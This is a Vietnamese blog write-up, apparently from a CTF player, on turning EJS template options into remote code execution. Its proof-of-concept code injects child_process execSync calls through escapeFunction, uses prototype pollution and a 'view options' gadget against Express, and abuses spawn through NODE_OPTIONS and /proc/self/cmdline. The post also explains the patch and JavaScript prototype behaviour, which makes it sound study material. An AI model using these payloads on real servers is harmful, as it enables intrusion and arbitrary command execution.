---
title: "Some notes on EJS2RCE"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-07-20
draft: false
authors:
  - Hibwyli
---

# DEEP DOWN TO EJS 

# Example usage : 
- Đơn giản như sau thui : 
```js 
    const ejs = require("ejs")
    const template = '<h1>Hello <%= name %></h1>';
    ejs.clearCache();
    const data = { name: "12113awefeaw" }
    const compiled = ejs.render(template, data, {}); 
    console.log(compiled.toString())
```
# How ejs works
Ta cùng đọc qua về hàm render : 
```js

      exports.render = function (template, d, o) {
        var data = d || utils.createNullProtoObjWherePossible();
        var opts = o || utils.createNullProtoObjWherePossible();

        // No options object -- if there are optiony names
        // in the data, copy them to options
        if (arguments.length == 2) {
          utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
        }

        return handleCache(opts, template)(data);
      };
```
- Hàm nhận vào data và options .
- Nếu không có options thì kiểu tra data xem có key nào có thể cho vào OPTIONS hay không theo danh sách trên : 
 ```js
var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
 ```
 - Sau đó gọi hàm handleCache nhận về một function và cho data làm đối số. Vậy ta sẽ phải tìm hiểu hàm handleCache sẽ trả về function gì .
 
handleCache : 
```js

      function handleCache(options, template) {
        var func;
        var filename = options.filename;
        var hasTemplate = arguments.length > 1;

        if (options.cache) {
          if (!filename) {
            throw new Error('cache option requires a filename');
          }
          func = exports.cache.get(filename);
          if (func) {
            return func;
          }
          if (!hasTemplate) {
            template = fileLoader(filename).toString().replace(_BOM, '');
          }
        }
        else if (!hasTemplate) {
          // istanbul ignore if: should not happen at all
          if (!filename) {
            throw new Error('Internal EJS error: no file name or template '
              + 'provided');
          }
          template = fileLoader(filename).toString().replace(_BOM, '');
        }
        func = exports.compile(template, options);
        if (options.cache) {
          exports.cache.set(filename, func);
        }
        return func;
      }
```
- Trước hết nó sẽ kiểm tra options cache xem có hay không sau đó sẽ dùng filename đó đưa vào hàm cache.get(filename) để nhận về một function thứ mà ta có thể đưa data vào để nhận được template cuối cùng.
- Trường hợp không có cache thì sẽ dùng hàm **compile** với template và options được truyền vào.

compile function  : 
```js 

      exports.compile = function compile(template, opts) {
        var templ;

        // v1 compat
        // 'scope' is 'context'
        // FIXME: Remove this in a future version
        if (opts && opts.scope) {
          if (!scopeOptionWarned) {
            console.warn('`scope` option is deprecated and will be removed in EJS 3');
            scopeOptionWarned = true;
          }
          if (!opts.context) {
            opts.context = opts.scope;
          }
          delete opts.scope;
        }
        templ = new Template(template, opts);
        return templ.compile();
      };
```
- Tạo một Object template và trả về kết quả sau khi gọi hàm templ.compile()
- Class Template khá lớn nên mình sẽ tập trung vào hàm compile của nó . Hàm compile này là core function để tạo nên một function sẽ nhận data và trả về template.
- Trước khi đọc các giai đoạn nó tạo ra hàm thì ta có thể đơn giản là log hàm đó ra : 
```js 
function anonymous(data) {
      var include = function (path, includeData) {
        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      };
      return fn.apply(opts.context,
        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
    }
```
- Copy data các kiểu xong sẽ dùng hàm fn.apply vậy ta cần biết fn ở đây là hàm gì . Đọc source ta có thẻ thấy đoạn sau  : 
```js 
    var returnedFn = opts.client ? fn : function anonymous(data) {
      var include = function (path, includeData) {
        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      };
      console.log(fn.toString())
      return fn.apply(opts.context,
        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
    };
```
- Với options.client =0 thì ta sẽ nhận được hàm trên và fn ở đây sau khi log ra thì ta có  : 
```js 
function anonymous(locals, escapeFn, include, rethrow
) {
var __line = 1
  , __lines = "<h1>Hello <%= name %></h1>"
  , __filename = undefined;
try {
  var __output = "";
  function __append(s) { if (s !== undefined && s !== null) __output += s }
  with (locals || {}) {
    ; __append("<h1>Hello ")
    ; __append(escapeFn( name ))
    ; __append("</h1>")
  }
  return __output;
} catch (e) {
  rethrow(e, __lines, __filename, __line, escapeFn);
}

}
```
- Đến đây ta hoàn toàn có thể thấy được logic mà name được đưa vào template. Khá phức tạp ở đây nhưng ta sẽ tiếp tục đọc vào hàm này. 
- Đây là source generate được đống function trên bằng cách ghép nhiều chuỗi với nhau 
```js  

    if (!this.source) {
      this.generateSource();
      prepended +=
        '  var __output = "";\n' +
        '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
      if (opts.outputFunctionName) {
        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
          throw new Error('outputFunctionName is not a valid JS identifier.');
        }
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
      if (opts.localsName && !_JS_IDENTIFIER.test(opts.localsName)) {
        throw new Error('localsName is not a valid JS identifier.');
      }
      if (opts.destructuredLocals && opts.destructuredLocals.length) {
        var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
        for (var i = 0; i < opts.destructuredLocals.length; i++) {
          var name = opts.destructuredLocals[i];
          if (!_JS_IDENTIFIER.test(name)) {
            throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.');
          }
          if (i > 0) {
            destructuring += ',\n  ';
          }
          destructuring += name + ' = __locals.' + name;
        }
        prepended += destructuring + ';\n';
      }
      if (opts._with !== false) {
        prepended += '  with (' + opts.localsName + ' || {}) {' + '\n';
        appended += '  }' + '\n';
      }
      appended += '  return __output;' + '\n';
      this.source = prepended + this.source + appended;
    }

    if (opts.compileDebug) {
      src = 'var __line = 1' + '\n'
        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
        + 'try {' + '\n'
        + this.source
        + '} catch (e) {' + '\n'
        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
        + '}' + '\n';
    }
    else {
      src = this.source;
    }

    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }

    if (opts.strict) {
      src = '"use strict";\n' + src;
    }
    if (opts.debug) {
      console.log(src);
    }
    if (opts.compileDebug && opts.filename) {
      src = src + '\n'
        + '//# sourceURL=' + sanitizedFilename + '\n';
    }
```
- Đến đây ta đã biết rằng hàm sau sẽ được execute và hàm được tạo bởi các string ghép lại ? Vậy sẽ thế nào nếu ta có thẻ input tùy ý vào hàm này qua options của ejs? Từ đó lấy RCE ? Ta sẽ đi tìm một vài điểm nào đó có thể cho ta input vào . Nhìn sơ ta có thể thấy 
```js 
      if (opts.outputFunctionName) {
        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
          throw new Error('outputFunctionName is not a valid JS identifier.');
        }
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
```
Nhưng vì có regrex khá căng nên cũng không khả thi lắm. Riêng chỉ có đoạn này :  
```js 
    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }
```
Well cả 2 biến client và escapeFn đều được lấy từ options object vào ? Sẽ ra sao nếu ta split javascript code với ";" và chèn rce code vào ? 
```js 
const ejs = require("ejs")
const template = '<h1>Hello <%= name %></h1>';
escapeFunction = "JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());"
const data = { name: "12113awefeaw" }
const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works 
console.log(compiled.toString())
```
Khi này function sau sẽ được generate ra :  
```js 
function anonymous(locals, escapeFn, include, rethrow
) {
rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) {
  var lines = str.split('\n');
  var start = Math.max(lineno - 3, 0);
  var end = Math.min(lines.length, lineno + 3);
  var filename = esc(flnm);
  // Error context
  var context = lines.slice(start, end).map(function (line, i) {
    var curr = i + start + 1;
    return (curr == lineno ? ' >> ' : '    ')
      + curr
      + '| '
      + line;
  }).join('\n');

  // Alter exception message
  err.path = filename;
  err.message = (filename || 'ejs') + ':'
    + lineno + '\n'
    + context + '\n\n'
    + err.message;

  throw err;
};
    /*OUR OPTIONS GOES IN HERE */
escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
var __line = 1
  , __lines = "<h1>Hello <%= name %></h1>"
  , __filename = undefined;
try {
  var __output = "";
  function __append(s) { if (s !== undefined && s !== null) __output += s }
  with (locals || {}) {
    ; __append("<h1>Hello ")
    ; __append(escapeFn( name ))
    ; __append("</h1>")
  }
  return __output;
} catch (e) {
  rethrow(e, __lines, __filename, __line, escapeFn);
}

}
```
Và ta đã có thể chạy bất kì js command nào !!!
```js
escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
```
![image](https://hackmd.io/_uploads/HyQcobyOxg.png)

## Prototype pollution to RCE . 
- Nhưng trong thực tế ta sẽ không kiểm soát được options được chèn vào . Vậy sẽ ra sao nếu ta có một prototype pollution ở phía server ? Test với đoạn code sau  : 

```js 
const ejs = require("ejs")
const template = '<h1>Hello <%= name %></h1>';
ejs.clearCache();
escapeFunction = "JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());"
Object.prototype.client = true
Object.prototype.escapeFunction = escapeFunction
const data = { name: "12113awefeaw" }
const compiled = ejs.render(template, data); // not works 
console.log(compiled.toString())

```
Hmmmm , ta thấy không có gì xảy ra cả vì nếu để ý từ đầu đoạn code đã có một phần check rất rõ  : 
```js
      exports.render = function (template, d, o) {
        var data = d || utils.createNullProtoObjWherePossible();
        var opts = o || utils.createNullProtoObjWherePossible();
      }
```
Điều này đã block việc protoytpe pollution nhưng có một vấn đề là nhiều project ở ngoài kia sẽ không bao giờ để trống options field và đơn giản sẽ truyền vào đó một **empty object** ~ ~!! chính điều này là root cause cho việc bypass này , để simluate ta đơn giản chỉ cần truyền {} vào là đc .
```js 
const ejs = require("ejs")
const template = '<h1>Hello <%= name %></h1>';
ejs.clearCache();
escapeFunction = "JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());"
Object.prototype.client = true
Object.prototype.escapeFunction = escapeFunction
const data = { name: "12113awefeaw" }
const compiled = ejs.render(template, data, {}); // works now with polluted {}
console.log(compiled.toString())
``` 
- Tèn ten , điều này hoạt động vì hàm render sẽ ưu tiên nhận object từ ngoài vào.
![image](https://hackmd.io/_uploads/ByAHKC-Ole.png)


# Express js 
- Để kiểm chứng việc truyền object trống vào options ta có thể xem sơ qua source của express js ta sẽ thấy đoạn sau  : 
![image](https://hackmd.io/_uploads/BkWcAZyueg.png)
Vì luôn có options object nên Express default cũng có thể bị lỗi này .
### POC : 
Server.js :
```js 
const express = require('express');
const path = require('path');

const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());


// Set EJS as the template engine
app.set('view engine', 'ejs');

// Set the views directory
app.set('views', path.join(__dirname, 'views'));

app.post("/pollute_me", (req, res) => {
    // Prototype pollution vulnerability here
    Object.assign(Object.prototype, req.body);
    console.log({}.client)
    res.send('Updated!');
})
// Define a simple route
app.get('/', (req, res) => {
    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

```
ex.py  : 

```py 
import  requests
url = "http://localhost:3000"
escapeFunction = "JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());"
data  = { 
        "client" : '123' ,
        "escapeFunction" : escapeFunction
}
res = requests.post(url+'/pollute_me' ,json=data)
print(res.text)
requests.get(url)

```

*Express views use a default config when calling templating function, which make it vulnerable by default!*
# Another gadget : 
- Sẽ ra sao nếu ta không có prototype pollution nhưng có thể handle được biến data ? 
Khi express gọi tới render bản chất nó sẽ gọi tới **export.__express**  

```js
   // default engine export
    var fn = require(mod).__express
```    

Ejs : 
```js 
/**
 * Express.js support.
 *
 * This is an alias for {@link module:ejs.renderFile}, in order to support
 * Express.js out-of-the-box.
 *
 * @func
 */

exports.__express = exports.renderFile;

```

Vậy bản chất của express sẽ gọi tới hàm renderFile : 

```js 

exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = { filename: filename };
  var data;
  var viewOpts;

  // Do we have a callback?
  if (typeof arguments[arguments.length - 1] == 'function') {
    cb = args.pop();
  }
  // Do we have data/opts?
  if (args.length) {
    // Should always have data obj
    data = args.shift();
    // Normal passed opts (data obj + opts obj)
    if (args.length) {
      // Use shallowCopy so we don't pollute passed in opts obj with new vals
      utils.shallowCopy(opts, args.pop());
    }
    // Special casing for Express (settings + opts-in-data)
    else {
      // Express 3 and 4
      if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        // Undocumented after Express 2, but still usable, esp. for
        // items that are unsafe to be passed along with data, like `root`
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
      // Express 2 and lower, values set in app.locals, or people who just
      // want to pass options in their data. NOTE: These values will override
      // anything previously set in settings  or settings['view options']
      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    }
    opts.filename = filename;
  }
  else {
    data = utils.createNullProtoObjWherePossible();
  }

  return tryHandleCache(opts, data, cb);
};
```
Hàm này khá tương đồng với hàm render bình thường nhưng sẽ có vài điểm đặc biệt đó là :  
```js
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
```
- Ta có thể thấy ở đây , data có thể ảnh hưởng trực tiếp tới biến **opts**  và từ đó chẳng khác gì ta có thể kiểm soát biển opts và lấy rce .

### POC :  
server.js : 
```js 
const express = require('express');
const path = require('path');

const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());


// Set EJS as the template engine
app.set('view engine', 'ejs');

// Set the views directory
app.set('views', path.join(__dirname, 'views'));

app.post("/pollute_me", (req, res) => {
    // Prototype pollution vulnerability here
    const data = { title: 'Hello EJS', message: 'Welcome to EJS Template!' }
    Object.assign(data, req.body);
    res.render('index', data)
})
// Define a simple route
app.get('/', (req, res) => {
    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

```
ex.py : 
```js 
import  requests
url = "http://localhost:3000"
escapeFunction = "JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());"
data  = { 
    "settings" : {
        "view options" : {
         "client" : '123' ,
        "escapeFunction" : escapeFunction       
        }
    }
}
res = requests.post(url+'/pollute_me' ,json=data)
print(res.text)
requests.get(url)

```
- **Lưu ý**:  gadget trên chỉ hoạt động khi kiểm soát được property trực tiếp của data chứ không phải proottype pollution vì khi parse **renderOptions** , nó chỉ copy các own property thui chứ không dùng luôn cả objects đấy.
```js 
var renderOptions = { ...this.locals, ...opts._locals, ...opts };
```

# How it get patched

- Vì root cause ở đây là do hàm generate Template function nhận opts mà không kiểm tra kĩ nên patch đơn giản nhưu sau  : 
https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10
![image](https://hackmd.io/_uploads/BJ7m3GkOee.png)

Nó sẽ kiểm tra các biến có phải là property trực tiếp hay không sau đó trả copy vào một Null Object và returns về . Không biết có bypass đc ko :v 
Nhìn chung nếu ta có thể kiểm soát biến data (not prototype pollution) thì rce vẫn posssible .

# Universal Gadget
https://portswigger.net/web-security/prototype-pollution/server-side
- Ngoài ra có một gadget khá nguy hiểm đối với các phiên bản Node js cũ khi spawn một process mới . 
```js 
function spawn(file, args, options) {
    const child = new ChildProcess();

    options = normalizeSpawnArguments(file, args, options);
    debug('spawn', options);
    child.spawn(options);

    return child;
}

```
Hàm trên sẽ tạo một process và truyền options được lấy từ **normalizeSpawnArguments**
Vấn đề ở đây là hàm trên có một bug về pp . 
```j
    const env = options.env || process.env;
    const envPairs = [];
    // Prototype values are intentionally included.
    for (const key in env) {
        const value = env[key];
        if (value !== undefined) {
            envPairs.push(`${key}=${value}`);
        }
    }
 return {
        // Make a shallow copy so we don't clobber the user's options object.
        ...options,
        args,
        detached: !!options.detached,
        envPairs,
        file,
        windowsHide: !!options.windowsHide,
        windowsVerbatimArguments: !!windowsVerbatimArguments
    };
```
- Như ta đã biết vòng for in ở đây sẽ loop qua cả các prototype và dường như điều này đã được các developer intend nhưng mà không hiểu sao lại intend v nữa : )
- Vậy spawn một process mới và kiểm soát được options thì ta có thể làm được gì ? Có một options khá thú vị nếu như ta spawn một **node** process . 
Đó là NODE_OPTIONS : https://nodejs.org/api/cli.html#node_optionsoptions
![image](https://hackmd.io/_uploads/SyeQrpZOll.png)
Và ta có thể thấy  : 
![image](https://hackmd.io/_uploads/HymIrpWugx.png)
Kết hợp điều này với gadget trên thì ta có thể dễ dàng lấy RCE . Vậy làm sao có thể làm được khi ta không có thể tạo file ? Ta có thể lợi dụng các file đặc biệt như /proc/self/environ như ví dụ ở Kibana nhưng điều này đã bị chặn và không còn khả thi  vì node js đã fixx lỗi này và luôn đặt environ ở cuối cùng.
- Vậy là sao để bypass  ?
Ta sẽ lợi dụng một file đặc biệt là file **/proc/self/cmdline** là file sẽ trả về argv[0] ví dụ  : 
```js 
const { spawn } = require("child_process");

const ls = spawn("node", ["rce.js"], {
    env: {
        ...process.env, // inherit parent env
    },
    stdio: "inherit"  // pipe output directly to parent terminal
});

```
rce.js : 
```js 
const fs = require("fs");

const cmdline = fs.readFileSync("/proc/self/cmdline");
console.log(cmdline.toString().split("\0"));

```
Khi này ta sẽ thấy argv[0] tương đương với 'node'  :  
![image](https://hackmd.io/_uploads/H1byy0b_ee.png)
- Và điều đặc biệt là spawn function có hỗ trợ chức năng set argv[0] mà không làm thay đổi executable file . 
![image](https://hackmd.io/_uploads/By5WyR-Oxx.png)
```js 
const { spawn } = require("child_process");

const ls = spawn("node", ["rce.js"], {
    argv0: "abc",
    env: {
        ...process.env, // inherit parent env
    },
    stdio: "inherit"  // pipe output directly to parent terminal
});
```
![image](https://hackmd.io/_uploads/HJzVkCZdgg.png)
Kết hợp điều này với NODE_OPTIONS và /proc/self/cmdline ta có payload như sau  :+1: 
```js 
const { spawn } = require("child_process");

const ls = spawn("node", ["rce.js"], {
    argv0: "console.log(123);//",
    env: {
        ...process.env, // inherit parent env
        NODE_OPTIONS: "--require /proc/self/cmdline"
    },
    stdio: "inherit"  // pipe output directly to parent terminal
});
```
![image](https://hackmd.io/_uploads/S1hLy0bOxg.png)
- Cuối cùng kết hợp với prototype pollution thì ta sẽ dễ dàng có được rce . 
```js 
const { spawn } = require("child_process");

Object.prototype.env = {}; // dummy object
Object.prototype.env.NODE_OPTIONS = "--require /proc/self/cmdline"; // trigger loadJ
Object.prototype.argv0 = `require("child_process").execSync("id > pwn");//`;

spawn("node");
```
![image](https://hackmd.io/_uploads/SkbvVAZugg.png)
# Một vài điểm thú vị về for in : 
Xét ví dụ sau : 

```js 
scripts = {
    "pace": "https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js",
    "main": "/main.js",
}

Object.prototype.polluted = "WTF"
console.log("Just log it out : ", scripts)

for (let script in scripts) {
    console.log("[" + script + "] => " + scripts[script])
}
```
Kết quả sẽ có chứa polluted không ? Câu trả lời là có   : 
![image](https://hackmd.io/_uploads/H1jr8KJ_gl.png)
Đọc tí document về tính chất của for in ta có thể thấy rằng https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties 
![image](https://hackmd.io/_uploads/ry2vUFJuxl.png)
Nó sẽ chấp nhận luôn cả những enumerable là inherited từ Object prototype ! Bài này mình thấy ở malta ctf khá hay  (mặc dù mình k giải ra:( )
# So sánh \__proto__ và constructor.prototype? 

Như mọi người ai cũng biết là khi làm prototype pollution ta thường dùng các key như "__proto__" hay "constructor.prototype" để access được Object.prototype nhưng vì sao lại như vậy ? 
## Constructor.prototype : 
- Ta có thể hiểu đơn giản là lấy prototype của constructor đó . 
Nhìn vào đoạn code sau : 
```js
    const a = {} ;
Tương đương với
    const a = Object.create(Object.prototype)
    
```
![image](https://hackmd.io/_uploads/rJeswK1ugl.png)
- Hàm Object.create sẽ tạo một object và sử dụng một Object đang tồn tại làm prototype cho chúng và lưu vào \_\_proto__ . 
- Còn constructor là trỏ về object và lấy prootytpe của Object . Nên vô tình sẽ khiến cho \_\_proto\_\_ == Object.prototype

## \_\_proto\_\_
- Sẽ có các trường hợp \_\_proto\_\_ sẽ khác với constructor.prototype như : 
![image](https://hackmd.io/_uploads/rykrdYyOlx.png)
- Ví dụ trên trang chính vậy. Khi này \_\_proto\_\_ == person. 
![image](https://hackmd.io/_uploads/B1guOY1Oxg.png)
- Còn constructor của nó vẫn là Object nên đơn giản trả về Object prototype
![image](https://hackmd.io/_uploads/BJH5Ot1Oxl.png)

# Các method để lấy Prototype 
- Cái nì mình tóm tắt trick lỏ lấy được từ X thôi :v 
https://x.com/arkark_/status/1943260773268230205?s=46
![8219bfac-78cd-4b0e-9186-92f075010cd6](https://hackmd.io/_uploads/HyXNttk_lg.jpg)



# Resource : 
https://nodejs.org/api/cli.html#cli_node_options_options
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof
https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
